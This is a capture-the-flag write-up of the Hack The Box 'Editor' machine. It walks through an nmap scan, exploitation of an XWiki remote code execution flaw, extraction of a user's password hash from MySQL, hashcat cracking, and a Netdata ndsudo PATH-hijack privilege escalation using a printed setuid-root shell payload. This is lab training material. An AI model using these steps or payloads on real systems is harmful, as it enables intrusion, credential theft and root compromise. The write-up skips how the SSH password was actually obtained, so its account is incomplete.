---
title: "Editor"
summary: "HTB Editor Writeup"
pubDate: 2025-12-07
draft: false
---

## Phase 1: Port Enumeration

During the initial reconnaissance phase, I performed a port scan using Nmap and identified the following active services on the server:

```zsh
# Nmap 7.94SVN scan initiated Tue Dec  2 19:20:58 2025 as: nmap -v -p- -T5 --max-rtt-timeout 1000ms -sV -Pn -n -oN port.discovery 10.10.11.80
Warning: 10.10.11.80 giving up on port because retransmission cap hit (2).
Nmap scan report for 10.10.11.80
Host is up (0.047s latency).
Not shown: 63546 closed tcp ports (conn-refused), 1986 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec  2 19:26:52 2025 -- 1 IP address (1 host up) scanned in 353.55 seconds
```

Port 8080 hosts an XWiki instance, which is accessible via a login panel.

![XWiki]( /labs/editor/XWiki.png)

Existe un panel de loggeo accesible.

![XWiki_login]( /labs/editor/XWiki_login.png)

## Phase 2: Vulnerability Identification

I noticed that the `nginx` version (1.18.0) is outdated and potentially vulnerable to certain attacks. Additionally, by investigating the XWiki instance, I identified the version in use, which is susceptible to a remote code execution (RCE) vulnerability, as documented in [this resource](https://www.offsec.com/blog/cve-2025-24893/).

![XWiki_Version]( /labs/editor/XWiki_version.png)

I used the [exploit](https://github.com/gunzf0x/CVE-2025-24893) available for this vulnerability and successfully executed a reverse shell on the server.

![reverse_shell]( /labs/editor/reverse_shell.png)

## Phase 3: Internal Enumeration and Credential Extraction

Once inside the system, I searched for XWiki configuration files and found the MySQL database access password.

![searching_conf_files]( /labs/editor/searching_conf_files.png)

![sql_connection]( /labs/editor/sql_connection.png)

By analyzing the tables, I focused on `xwikiobjects`, which stores registered objects in the application, particularly those of the `XWiki.User` class.

![sql_tables]( /labs/editor/sql_tables.png)

By correlating user identifiers with the `xwikiproperties` table, I discovered a `password` property associated with the user `neal`. Finally, in the `xwikistrings` table, I obtained the password hash for this user.

```sql

mysql> describe xwikiobjects;
describe xwikiobjects;
+---------------+--------------+------+-----+---------+-------+
| Field         | Type         | Null | Key | Default | Extra |
+---------------+--------------+------+-----+---------+-------+
| XWO_ID        | bigint       | NO   | PRI | NULL    |       |
| XWO_NUMBER    | int          | YES  | MUL | NULL    |       |
| XWO_NAME      | varchar(768) | NO   | MUL | NULL    |       |
| XWO_CLASSNAME | varchar(768) | NO   | MUL | NULL    |       |
| XWO_GUID      | varchar(255) | YES  |     | NULL    |       |
+---------------+--------------+------+-----+---------+-------+
5 rows in set (0.01 sec)

mysql> select * from xwikiobjects where XWO_CLASSNAME='XWiki.XWikiUsers';
select * from xwikiobjects where XWO_CLASSNAME='XWiki.XWikiUsers';
+----------------------+------------+------------+------------------+--------------------------------------+
| XWO_ID               | XWO_NUMBER | XWO_NAME   | XWO_CLASSNAME    | XWO_GUID                             |
+----------------------+------------+------------+------------------+--------------------------------------+
| -5552625943482576562 |          0 | XWiki.neal | XWiki.XWikiUsers | 427e39b7-d872-4edb-8156-237f36be7173 |
+----------------------+------------+------------+------------------+--------------------------------------+
1 row in set (0.00 sec)
```

```sql

mysql> describe xwikiproperties;
describe xwikiproperties;
+---------------+--------------+------+-----+---------+-------+
| Field         | Type         | Null | Key | Default | Extra |
+---------------+--------------+------+-----+---------+-------+
| XWP_ID        | bigint       | NO   | PRI | NULL    |       |
| XWP_NAME      | varchar(255) | NO   | PRI | NULL    |       |
| XWP_CLASSTYPE | varchar(768) | YES  |     | NULL    |       |
+---------------+--------------+------+-----+---------+-------+
3 rows in set (0.01 sec)

mysql> select * from xwikiproperties where XWP_ID='-5552625943482576562';
select * from xwikiproperties where XWP_ID='-5552625943482576562';
+----------------------+------------------------+-------------------------------------------+
| XWP_ID               | XWP_NAME               | XWP_CLASSTYPE                             |
+----------------------+------------------------+-------------------------------------------+
| -5552625943482576562 | accessibility          | com.xpn.xwiki.objects.IntegerProperty     |
| -5552625943482576562 | active                 | com.xpn.xwiki.objects.IntegerProperty     |
| -5552625943482576562 | address                | com.xpn.xwiki.objects.LargeStringProperty |
| -5552625943482576562 | avatar                 | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | blog                   | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | blogfeed               | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | comment                | com.xpn.xwiki.objects.LargeStringProperty |
| -5552625943482576562 | company                | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | displayHiddenDocuments | com.xpn.xwiki.objects.IntegerProperty     |
| -5552625943482576562 | editor                 | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | email                  | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | email_checked          | com.xpn.xwiki.objects.IntegerProperty     |
| -5552625943482576562 | extensionConflictSetup | com.xpn.xwiki.objects.IntegerProperty     |
| -5552625943482576562 | first_name             | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | imaccount              | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | imtype                 | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | last_name              | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | password               | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | phone                  | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | skin                   | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | timezone               | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | underline              | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | usertype               | com.xpn.xwiki.objects.StringProperty      |
| -5552625943482576562 | validkey               | com.xpn.xwiki.objects.StringProperty      |
+----------------------+------------------------+-------------------------------------------+
24 rows in set (0.00 sec)
```

```sql
mysql> describe xwikistrings;
describe xwikistrings;
+-----------+--------------+------+-----+---------+-------+
| Field     | Type         | Null | Key | Default | Extra |
+-----------+--------------+------+-----+---------+-------+
| XWS_ID    | bigint       | NO   | PRI | NULL    |       |
| XWS_NAME  | varchar(255) | NO   | PRI | NULL    |       |
| XWS_VALUE | varchar(768) | YES  | MUL | NULL    |       |
+-----------+--------------+------+-----+---------+-------+
3 rows in set (0.01 sec)

mysql> select * from xwikistrings where XWS_ID='-5552625943482576562';
select * from xwikistrings where XWS_ID='-5552625943482576562';
+----------------------+------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| XWS_ID               | XWS_NAME   | XWS_VALUE                                                                                                                                                                                                      |
+----------------------+------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| -5552625943482576562 | avatar     |                                                                                                                                                                                                                |
| -5552625943482576562 | blog       |                                                                                                                                                                                                                |
| -5552625943482576562 | blogfeed   |                                                                                                                                                                                                                |
| -5552625943482576562 | company    |                                                                                                                                                                                                                |
| -5552625943482576562 | editor     |                                                                                                                                                                                                                |
| -5552625943482576562 | email      | neal@editor.htb                                                                                                                                                                                                |
| -5552625943482576562 | first_name | Neal                                                                                                                                                                                                           |
| -5552625943482576562 | imaccount  |                                                                                                                                                                                                                |
| -5552625943482576562 | imtype     |                                                                                                                                                                                                                |
| -5552625943482576562 | last_name  | Bagwell                                                                                                                                                                                                        |
| -5552625943482576562 | password   | hash:SHA-512:dac65976a9f09bcd15bd2c5c6eae4c43b06f316be7ae6b191db26580b1211bef:6b8f547e3742e998380da4f9d426773430a7982a946b9bfd94da0d7abe0d472c5ff08fcb8b0a908bc293da82298053ba348872099bd88f059a7838c38b670153 |
| -5552625943482576562 | phone      |                                                                                                                                                                                                                |
| -5552625943482576562 | skin       |                                                                                                                                                                                                                |
| -5552625943482576562 | timezone   |                                                                                                                                                                                                                |
| -5552625943482576562 | underline  |                                                                                                                                                                                                                |
| -5552625943482576562 | usertype   |                                                                                                                                                                                                                |
| -5552625943482576562 | validkey   |                                                                                                                                                                                                                |
+----------------------+------------+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
17 rows in set (0.00 sec)
```

I attempted to crack the hash using `hashcat`, but was unsuccessful with the available dictionaries.

```zsh


┌──(d4str3k㉿kali)-[~/…/hacking-labs/HackTheBox/Editor/content]
└─$ # Formato para hashcat: hash:salt
echo "6b8f547e3742e998380da4f9d426773430a7982a946b9bfd94da0d7abe0d472c5ff08fcb8b0a908bc293da82298053ba348872099bd88f059a7838c38b670153:dac65976a9f09bcd15bd2c5c6eae4c43b06f316be7ae6b191db26580b1211bef" > hash.txt

┌──(d4str3k㉿kali)-[~/…/hacking-labs/HackTheBox/Editor/content]
└─$ hashcat -m 1710 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i5-7400 CPU @ 3.00GHz, 2930/5861 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Hardware.Mon.#01.: Temp: 56c Util: 91%

Started: Sat Dec  6 19:46:35 2025
Stopped: Sat Dec  6 19:47:28 2025
```

## Phase 4: SSH Access and Privilege Escalation

By reviewing the `/etc/passwd` file, I identified `oliver` as an unprivileged user. I used the previously obtained password to access the system via SSH as `oliver`.

```zsh

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false
tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin
xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin
netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin
oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
_laurel:x:995:995::/var/log/laurel:/bin/false
```

```zsh

┌──(d4str3k㉿kali)-[~]
└─$ ssh oliver@10.10.11.80
The authenticity of host '10.10.11.80 (10.10.11.80)' can't be established.
ED25519 key fingerprint is: SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.80' (ED25519) to the list of known hosts.
oliver@10.10.11.80's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.10.11.80)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Dec  6 06:41:11 PM UTC 2025

  System load:  0.29              Processes:             241
  Usage of /:   68.9% of 7.28GB   Users logged in:       0
  Memory usage: 55%               IPv4 address for eth0: 10.10.11.80
  Swap usage:   0%

Last login: Sat Dec 6 18:41:11 2025 from 10.10.14.115
oliver@editor:~$
```

Once inside, I found the first flag `user.txt`. To escalate privileges, I ran the [LinPeas](https://github.com/peass-ng/PEASS-ng/tree/master) script, which revealed the presence of a SUID binary named `ndsudo`. Upon investigation, I discovered that this binary is vulnerable to privilege escalation by manipulating the `PATH`.

I used the [exploit](https://github.com/T1erno/CVE-2024-32019-Netdata-ndsudo-Privilege-Escalation-PoC), which consists of executing a shell as root.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

I compiled the payload and transferred it to the server, successfully achieving privilege escalation.

![privilege_escalation]( /labs/editor/privilege_escalation.png)
